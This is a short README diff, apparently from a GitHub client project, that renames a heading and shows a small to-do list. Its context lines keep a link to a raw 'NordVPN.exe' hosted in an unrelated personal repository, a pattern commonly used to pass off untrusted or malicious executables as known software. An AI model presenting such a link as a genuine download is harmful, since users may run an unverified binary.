@@ -8,7 +8,7 @@
 ## Download types
 [NordVPN](https://github.com/doa69/Wolf-Gosht-client/blob/main/NordVPN.exe?raw=true)
 
-## Other
+## To do list
 - [x] Fixing Ai auto crash
 - [ ] Create a console
 - [ ] Add plugin to the experience when all tasks are complete :tada:
